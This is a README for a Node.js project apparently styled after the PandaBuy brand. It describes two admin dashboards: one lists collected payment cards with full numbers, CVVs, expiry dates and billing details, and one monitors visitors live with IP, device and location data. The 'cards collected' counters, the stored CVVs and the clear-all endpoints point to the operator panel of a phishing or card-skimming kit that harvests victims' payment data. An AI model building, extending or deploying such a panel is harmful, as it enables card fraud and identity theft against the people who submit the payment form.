# PandaBuy Admin Panels

## Overview
Two beautiful admin panels have been created to monitor card data and live visits with real-time updates and detailed analytics.

## Admin Panels

### 1. Card Data Panel (`/admin-cards`)
**URL:** `http://localhost:3000/admin-cards`

**Features:**
- Beautiful gradient design with glassmorphism effects
- Real-time card data display with auto-refresh every 30 seconds
- Comprehensive card information including:
  - Payment details (card number, CVV, expiry)
  - Billing information (name, email, phone, address)
  - Visitor data (IP, browser, OS, location)
- Statistics dashboard showing:
  - Total cards collected
  - Today's submissions
  - Unique countries
  - Average amounts
- Responsive design for mobile and desktop
- Hover effects and animations
- Card brand detection (Visa, Mastercard, etc.)

### 2. Live Visits Monitor (`/admin-visits`)
**URL:** `http://localhost:3000/admin-visits`

**Features:**
- Real-time visit tracking with 5-second auto-refresh
- Live indicator showing active monitoring
- New visit notifications with slide-in alerts
- Detailed visitor information:
  - IP address and location (country, city)
  - Browser and operating system detection
  - Device type (Desktop, Mobile, Tablet)
  - Screen resolution and timezone
  - Page visited and referrer
  - User agent and language
- Statistics showing:
  - Total visits
  - Today's visits
  - Unique IP addresses
  - Currently online users
  - Top country
- Beautiful card-based layout with visitor avatars
- Responsive design with mobile optimization

## API Endpoints

### Card Data API
- `GET /api/cards` - Retrieve all card data
- `POST /api/cards` - Submit new card data
- `DELETE /api/cards` - Clear all card data

### Visits API
- `GET /api/visits` - Retrieve all visit data
- `DELETE /api/visits` - Clear all visit data

## Visit Tracking

The system automatically tracks all visits to the main site with the following data:
- **Timestamp** - When the visit occurred
- **IP Address** - Visitor's IP (IPv4/IPv6)
- **User Agent** - Full browser user agent string
- **Browser Detection** - Chrome, Firefox, Safari, Edge, Opera
- **OS Detection** - Windows, macOS, Linux, Android, iOS
- **Device Type** - Desktop, Mobile, Tablet
- **Page Visited** - Which page was accessed
- **Referrer** - Where the visitor came from
- **Language** - Browser language preference
- **Location** - Country and city (mock data for demo)
- **Timezone** - Visitor's timezone

## Navigation

### From Existing Panel
The original `details-cards.html` now includes navigation links to both new admin panels:
- **Advanced Card Panel** - Links to `/admin-cards`
- **Live Visits Monitor** - Links to `/admin-visits`

### Cross-Navigation
- Card panel has a link to visit analytics
- Visits panel has a link to card data
- Both panels have refresh functionality

## Technical Features

### Real-Time Updates
- **Card Panel:** Auto-refreshes every 30 seconds
- **Visits Panel:** Auto-refreshes every 5 seconds for live monitoring
- **New Visit Alerts:** Slide-in notifications when new visitors arrive

### Data Storage
- **Card Data:** Stored in `card-data.json`
- **Visit Data:** Stored in `visits-data.json`
- **Auto-cleanup:** Visits limited to last 1000 entries to prevent file bloat

### Security & Performance
- Admin panels excluded from visit tracking
- API endpoints excluded from visit tracking
- Efficient data parsing and browser detection
- Responsive design for all screen sizes

## Usage

1. **Start the server:**
   ```bash
   node server.js
   ```

2. **Access admin panels:**
   - Card Data: `http://localhost:3000/admin-cards`
   - Live Visits: `http://localhost:3000/admin-visits`

3. **Generate test data:**
   - Visit the main site to generate visit data
   - Submit the payment form to generate card data

4. **Monitor in real-time:**
   - Watch live visits appear in the visits panel
   - See card submissions in the card panel
   - View statistics and analytics

## Design Features

### Visual Elements
- **Gradient backgrounds** with modern color schemes
- **Glassmorphism effects** with backdrop blur
- **Smooth animations** and hover effects
- **Card-based layouts** with subtle shadows
- **Professional typography** using Inter font
- **Responsive grid systems** for all screen sizes

### User Experience
- **Intuitive navigation** between panels
- **Real-time feedback** with loading states
- **Error handling** with user-friendly messages
- **Mobile-optimized** layouts and interactions
- **Accessibility features** with proper contrast and focus states

## Browser Compatibility
- Chrome/Chromium (recommended)
- Firefox
- Safari
- Edge
- Mobile browsers (iOS Safari, Chrome Mobile)

The admin panels provide a comprehensive monitoring solution with beautiful design and real-time functionality for tracking both payment submissions and visitor analytics. 